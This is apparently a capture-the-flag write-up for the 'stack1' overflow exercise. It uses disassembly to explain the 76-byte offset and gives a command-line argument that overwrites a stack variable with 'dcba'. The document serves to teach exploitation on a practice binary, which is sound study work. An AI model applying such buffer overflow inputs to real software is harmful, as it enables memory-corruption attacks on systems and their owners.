
## Answer

From using radare we can see that we are trying to write the string `dcba` into the variable modified.

To do this we just need to fill up the buffer by passing an arg of length 64 + 12 chars once we reach this the next char will start writting into modified.  So to solve we can simply do:

`./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMdcba
`

Why is it 76 chars to write the whole of buffer when the buffer size is 64?

I think looking at the code:

```
mov dword [rbp - 0x54], edi # this is where arg1 is put
cmp dword [rbp - 0x54], 1 # check that we passed one arg (this must be checking the arg array len which must be stored in 0x54)

...

lea rax, qword [rbp - 0x50] # our arg must be stored at [rbp - 0x50] which is -80d (load the value in rbp - 0x50 into rax ready to call strcpy)

...

mov eax, dword [rbp - 4] # variable modified is stored in [rbp - 4] this means the variable we pass in has total space 0x50 (80d) - x4 which is 80-4= 76 bytes.  
#  Each char is a byte this is why we need to pad with 76 chars to overwrite into the modified variable at the bottom of the stack. 
#  This command actually moves modified into eax ready to be compared.
cmp eax, 0x61626364 #  check we have overwritten modified with `dcba` to do this they need to come in chars 77-80 on the string we pass in
```
